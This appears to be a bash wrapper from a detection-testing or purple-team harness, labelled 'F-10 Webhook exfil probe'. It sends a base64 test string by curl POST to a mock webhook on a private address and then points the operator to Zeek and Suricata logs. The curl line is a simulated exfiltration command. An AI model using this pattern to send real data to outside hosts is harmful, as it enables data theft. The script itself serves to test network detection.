#!/bin/bash
# Plan 1.1 M5 thin wrapper — F-10: Webhook exfil network probe (npm-010)
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC1091
source "${HERE}/../lib/cadre-env.sh"
# shellcheck disable=SC1091
source "${HERE}/../lib/common.sh"
print_banner "Campaign F — F-10 Webhook exfil probe"
start_attack "F-10" "Webhook exfil network probe"
SINK="${MOCK_WEBHOOK:-http://192.168.77.40:8080/webhook-receiver}"
step "POST base64-ish body to mock sink (${SINK})"
require_tool curl
run_cmd "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"exfil\":\"dGVzdC1jYWRyZS1mMTA=\"}' --connect-timeout 5 '${SINK}' || true"
ok "F-10 probe sent — check Zeek http.log / Suricata npm-010"
result 0 "F-10 complete"
